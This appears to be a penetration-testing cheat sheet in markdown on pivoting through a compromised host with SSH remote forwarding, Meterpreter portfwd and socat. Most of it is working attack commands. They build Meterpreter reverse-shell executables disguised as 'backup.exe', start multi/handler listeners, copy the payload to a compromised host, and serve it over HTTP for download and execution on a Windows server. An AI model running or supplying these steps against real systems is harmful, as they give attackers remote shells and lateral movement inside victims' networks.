# SSH - Remote/Reverse port forwarding
SSH client - `DropBear`
#### ~~Create a `msf` payload~~ 
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<Internal_IPofPivotHost> lport=8080 -f exe -o backup.exe
```
#### ~~Starting multi/handler listener~~ 
```
use multi/handler; Set lhost 0.0.0.0; Set payload windows/x64/meterpreter/reverse_https; Set lport 8000 
```
#### ~~Transfer the payload to the pivot host~~ 
```
scp backup.exe ubuntu@<compromised_Target>:~/
```
#### ~~Transfer backup.exe to the windows server from compromised host~~ 
```
python3 -m http.server 8123
```
#### ~~Download from windows~~ 
```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backup.exe" -OutFile "C:\backupscript.exe"
```
# Remote port forwarding 
#### Using SSH-R 
```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<compromised_host_ip> -vN
```

---

# Meterpreter - Reverse port forwarding 

#### Reverse port forwarding rules 
```
portfwd add -R -L 8081 -p 1234 -L <attacker_host_ip>
```
#### Start MSF multi/handler 
```
set payload windows/x64/meterpreter/reverse_tcp; Set lport 8081; Set lhost 0.0.0.0; 
run -j
```
#### Generating windows payload 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<third_host_ip> -f exe -o backupscript.exe LPORT=1234
```
#### Execute payload on windows host 
Get meterpreter session

---

# Socat - Reverse port forwarding
#socat #protforwarding
In the machine, all traffic on 81 will be forwarded to 192.168.1.10:80
```
socat TCP4-LISTEN:81 TCP4:192.168.1.10:80
```

